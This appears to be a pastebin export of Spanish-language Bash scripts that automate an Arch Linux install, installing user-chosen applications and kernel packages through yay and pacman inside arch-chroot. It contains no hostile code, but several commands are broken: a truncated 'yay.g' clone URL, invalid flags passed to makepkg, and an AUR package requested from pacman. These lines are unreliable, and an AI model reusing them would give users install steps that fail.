arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S audacious --noeditmenu --noconfirm --needed""
fi


if [ ""$REPRO6"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S moc --noeditmenu --noconfirm --needed""
fi


if [ ""$REPRO7"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S cmus --noeditmenu --noconfirm --needed""
fi




if [ ""$WEB1"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S firefox --noeditmenu --noconfirm --needed""
fi

if [ ""$WEB2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S chromium --noeditmenu --noconfirm --needed""
fi

if [ ""$WEB3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S midori --noeditmenu --noconfirm --needed""
fi

if [ ""$WEB4"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S brave-bin --noeditmenu --noconfirm --needed""
fi

if [ ""$WEB5"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S google-chrome --noeditmenu --noconfirm --needed""
fi

if [ ""$WEB6"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S opera --noeditmenu --noconfirm --needed""
fi

if [ ""$WEB7"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vivaldi --noeditmenu --noconfirm --needed""
fi


if [ ""$WEB8"" == ""true"" ]; then
printf '%*s\n' ""${COLUMNS:-$(tput cols)}"" '' | tr ' ' ""_""
echo -e """"
echo -e ""\t\t\t         Actualizando Keys para Tor browser          ""
printf '%*s\n' ""${COLUMNS:-$(tput cols)}"" '' | tr ' ' _
echo -e """"
arch-chroot /mnt /bin/bash -c ""gpg --recv-keys EF6E286DDA85EA2A4BA7DE684E2C6E8793298290""
echo """"

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S tor-browser --noeditmenu --noconfirm --needed""
fi








if [ ""$OFFICE1"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libreoffice-fresh --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libreoffice-fresh-es --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell-es_es --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell-es_any --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hyphen --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hyphen-es --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S mythes-es --noeditmenu --noconfirm --needed""
fi

if [ ""$OFFICE2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S wps-office --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-wps-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell-es_es --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell-es_any --noeditmenu --noconfirm --needed""
fi

if [ ""$OFFICE3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S freeoffice --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell-es_es --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hunspell-es_any --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hyphen --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hyphen-es --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S mythes-es --noeditmenu --noconfirm --needed""
fi




if [ ""$AP1"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnome-system-monitor --noeditmenu --noconfirm --needed""
fi

if [ ""$AP2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S htop --noeditmenu --noconfirm --needed""
fi

if [ ""$AP3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S bashtop --noeditmenu --noconfirm --needed""
fi

if [ ""$AP4"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gtop --noeditmenu --noconfirm --needed""
fi

if [ ""$AP5"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gotop --noeditmenu --noconfirm --needed""
fi




if [ ""$RS1"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S telegram-desktop --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S aspell-es --noeditmenu --noconfirm --needed""
fi

if [ ""$RS2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S igdm-bin --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S aspell-es --noeditmenu --noconfirm --needed""
fi

if [ ""$RS3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S whatsapp-nativefier-dark --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S aspell-es --noeditmenu --noconfirm --needed""
fi

if [ ""$RS4"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S caprine --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S aspell-es --noeditmenu --noconfirm --needed""
fi

if [ ""$RS5"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S netflix-qdesktop --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S aspell-es --noeditmenu --noconfirm --needed""
fi

if [ ""$RS6"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S skypeforlinux-preview-bin --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S aspell-es --noeditmenu --noconfirm --needed""
fi



if [ ""$AUR1"" == ""true"" ]; then
#arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S yay-bin --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S --needed git base-devel && git clone https://aur.archlinux.org/yay.g && cd yay && sudo -u $username makepkg -si  --noeditmenu --noconfirm --needed""
fi

if [ ""$AUR2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S trizen --noeditmenu --noconfirm --needed""
fi

if [ ""$AUR3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pikaur --noeditmenu --noconfirm --needed""
fi

if [ ""$AUR4"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S aurman --noeditmenu --noconfirm --needed""
fi

if [ ""$AUR5"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pakku --noeditmenu --noconfirm --needed""
fi

if [ ""$AUR6"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pamac-aur --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""zcat /usr/share/app-info/xmls/community.xml.gz | sed 's|<em>||g;s|<\/em>||g;' | gzip > '/tmp/new.xml.gz'""
arch-chroot /mnt /bin/bash -c ""cp /tmp/new.xml.gz /usr/share/app-info/xmls/community.xml.gz""
arch-chroot /mnt /bin/bash -c ""pacman -S appstream --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""appstreamcli refresh-cache --force""
clear
fi

if [ ""$AUR7"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S octopi --noeditmenu --noconfirm --needed""
fi

if [ ""$AUR8"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S cylon --noeditmenu --noconfirm --needed""
fi

if [ ""$AUR9"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S argon --noeditmenu --noconfirm --needed""
fi

if [ ""$AUR10"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pakku-gui --noeditmenu --noconfirm --needed""
fi





if [ ""$GAM1"" == ""true"" ]; then
steaminstall
fi

if [ ""$GAM2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S wine-staging --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S giflib --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-giflib --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libpng --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libpng --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libldap --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libldap --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnutls --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-gnutls --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S mpg123 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-mpg123 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S openal --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-openal --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S v4l-utils --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-v4l-utils --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libpulse --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libpulse --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libgpg-error --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libgpg-error --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alsa-plugins --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-alsa-plugins --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alsa-lib --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-alsa-lib --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libjpeg-turbo --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libjpeg-turbo --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S sqlite --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-sqlite --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libxcomposite --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libxcomposite --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libxinerama --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libxinerama --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libgcrypt --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libgcrypt --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ncurses --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-ncurses --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S opencl-icd-loader --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-opencl-icd-loader --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libxslt --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libxslt --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libva --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libva --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gtk3 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-gtk3 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-plugins-base-libs --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-gst-plugins-base-libs --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S sdl --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S sdl2 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-sdl2 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vkd3d --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-vkd3d --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-headers --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-tools --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-icd-loader --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-vulkan-icd-loader --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ocl-icd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-ocl-icd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S opencl-headers --noeditmenu --noconfirm --needed""
fi




if [ ""$GAM3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S crossover --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libsm --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S giflib --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-giflib --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libpng --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libpng --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libldap --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libldap --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnutls --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-gnutls --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S mpg123 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-mpg123 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S openal --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-openal --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S v4l-utils --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-v4l-utils --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libpulse --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libpulse --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libgpg-error --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libgpg-error --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alsa-plugins --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-alsa-plugins --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alsa-lib --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-alsa-lib --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libjpeg-turbo --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libjpeg-turbo --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S sqlite --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-sqlite --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libxcomposite --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libxcomposite --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libxinerama --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libxinerama --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libgcrypt --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libgcrypt --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ncurses --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-ncurses --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S opencl-icd-loader --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-opencl-icd-loader --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libxslt --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libxslt --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libva --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libva --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gtk3 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-gtk3 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-plugins-base-libs --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-gst-plugins-base-libs --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S sdl --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S sdl2 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-sdl2 --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vkd3d --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-vkd3d --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-headers --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-tools --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-icd-loader --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-vulkan-icd-loader --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ocl-icd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-ocl-icd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S opencl-headers --noeditmenu --noconfirm --needed""
fi



if [ ""$GAM4"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S winetricks --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S zenity --noeditmenu --noconfirm --needed""
fi


if [ ""$GAM5"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lutris --noeditmenu --noconfirm --needed""
fi


if [ ""$GAM6"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S legendary --noeditmenu --noconfirm --needed""
fi


if [ ""$GAM7"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S retroarch --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S retroarch-assets-xmb --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S retroarch-assets-ozone --noeditmenu --noconfirm --needed""
fi


if [ ""$GAM8"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S snes9x-gtk --noeditmenu --noconfirm --needed""
fi


if [ ""$GAM9"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ppsspp --noeditmenu --noconfirm --needed""
fi

if [ ""$GAM10"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pcsx2 --noeditmenu --noconfirm --needed""
fi

if [ ""$GAM11"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S rpcs3 --noeditmenu --noconfirm --needed""
fi

if [ ""$GAM12"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S cemu --noeditmenu --noconfirm --needed""
fi

if [ ""$GAM13"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S citra-git --noeditmenu --noconfirm --needed""
fi

if [ ""$GAM14"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S desmume --noeditmenu --noconfirm --needed""
fi

if [ ""$GAM15"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S higan --noeditmenu --noconfirm --needed""
fi



}
"
AxqZyXph,installkernel,hyperiontitan,Bash,Friday 10th of May 2024 12:59:11 PM CDT,"#!/bin/bash

###########################################
####### FUNCION DE BARRA ##################
###########################################

installkernel () {
	
arch-chroot /mnt /bin/bash -c ""pacman -S --needed git base-devel && git clone https://aur.archlinux.org/yay.g && cd yay && sudo -u $username makepkg -si  --noeditmenu --noconfirm --needed""

case $kernel_select in

  linux-stable)

arch-chroot /mnt /bin/bash -c ""pacman -Syu --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -Syu --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -Sy alsi --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -Sy yay-bin --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""pacman -S linux --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S linux-headers --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S linux-firmware --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S mkinitcpio --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S pacman-mirrorlist --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S cryptsetup --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S lvm2 --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S logrotate --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S nano --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S hddtemp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S unzip --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S zip --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dnsmasq --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ethtool --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ndisc6 --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S inetutils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wvdial --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S gptfdisk --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhcp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhcpcd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhclient --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ppp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S netctl --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S networkmanager --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S iwd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S net-tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ifplugd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dialog --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S neofetch --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S git --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wget --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S lsb-release --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S accountsservice --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S bash-completion --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S less --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ntp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usb_modeswitch --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usbutils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S which --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S mtools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dosfstools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S exfatprogs --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ntfs-3g  --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S reiserfsprogs --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S btrfs-progs --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""pacman -S bridge-utils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S sof-firmware --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S firewalld --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S sof-tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S tlp --noconfirm --needed""



arch-chroot /mnt /bin/bash -c ""systemctl enable dhcpcd NetworkManager""

  ;;

  linux-hardened)

arch-chroot /mnt /bin/bash -c ""pacman -Syu --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -Syu --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -Sy alsi --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -Sy yay-bin --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""pacman -S linux-hardened --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S linux-hardened-headers --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S linux-firmware --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S mkinitcpio --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S pacman-mirrorlist --noconfirm --needed""
